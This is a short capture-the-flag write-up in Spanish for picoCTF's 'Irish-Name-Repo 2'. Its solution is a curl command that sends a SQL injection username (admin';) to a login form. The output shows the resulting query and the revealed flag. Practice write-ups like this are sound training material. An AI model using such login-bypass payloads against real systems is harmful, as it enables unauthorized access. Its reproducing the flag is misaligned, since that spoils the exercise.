# Irish-Name-Repo 2

## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Pistas

The password is being filtered.

## Solución

```
# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}

yosshell-picoctf@webshell:~$ curl -s curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>yosshell-picoctf@webshell:~$ 
```

## Bandera

picoCTF{m0R3_SQL_plz_fa983901}

## Notas adicionales



## Referencias
- https://jupiter.challenges.picoctf.org/problem/52849/
- http://jupiter.challenges.picoctf.org:52849